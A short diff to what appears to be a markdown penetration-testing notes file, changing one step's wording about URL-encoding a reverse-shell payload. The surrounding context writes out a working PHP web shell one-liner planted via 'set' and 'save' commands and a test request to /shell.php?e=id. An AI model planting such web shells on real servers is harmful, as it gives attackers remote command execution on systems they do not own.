@@ -148,7 +148,7 @@ For the latter method, a website, the following are the steps:
         - set 1 "<?php echo shell_exec($_GET['e'].' 2>&1'); ?>"
         - save
 4. all going well, navigate to /shell.php?e=id on the webserver and see if the username has shown up
-5. because of how mangled the file is, and the simplicity of the web shell, if you want to catch a reverse shell remember to url encode the payload you add to e
+5. because of how mangled the file is, and the simplicity of the web shell, if you want to catch a reverse shell remember to url encode the payload you add to `?e=`
 
 ## Brute forcing with hydra and cewl
 
